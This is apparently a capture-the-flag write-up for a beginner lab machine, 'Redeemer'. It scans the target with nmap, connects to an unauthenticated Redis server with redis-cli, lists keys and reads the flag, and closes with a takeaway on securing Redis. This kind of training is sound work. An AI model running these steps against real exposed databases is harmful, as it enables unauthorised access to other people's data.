# Redeemer

This machine introduces basic enumeration and interaction with an exposed Redis database.

## Verify connectivity to the target

Send an ICMP echo request to confirm that the target is reachable.

Command:

```bash
ping <target_ip>
```

## Find open ports and services running on the target IP

Scan a wider port range to identify services running beyond the default top 1000 ports.

Command:

```bash
nmap -sS -p 1-10000 -sV -v <target_ip>
```

Expected result:

* Port 6379: Redis

## Connect to the Redis server

Use the Redis command-line interface to connect to the target.

Command:

```bash
redis-cli -h <target_ip>
```

A successful connection provides an interactive Redis shell.

## Gather information about the Redis instance

Display server information, statistics, and configuration details.

Command:

```bash
info
```

Review the output for useful information such as:

* Redis version
* Number of databases
* Number of stored keys
* Server configuration

## Select a database

Redis stores data in logical databases identified by numbers.

Select a database:

```bash
select <db_number>
```

For example:

```bash
select 0
```

## Enumerate available keys

List all keys stored in the selected database.

Command:

```bash
keys *
```

The output will reveal available key names.

## Retrieve the contents of a key

Read the value stored in a specific key.

Command:

```bash
get <key_name>
```

For example:

```bash
get flag
```

The flag value will be displayed.

## Key Takeaway

Redis instances should never be exposed to untrusted networks without authentication. An unauthenticated Redis server can allow attackers to enumerate stored data and potentially gain access to sensitive information.
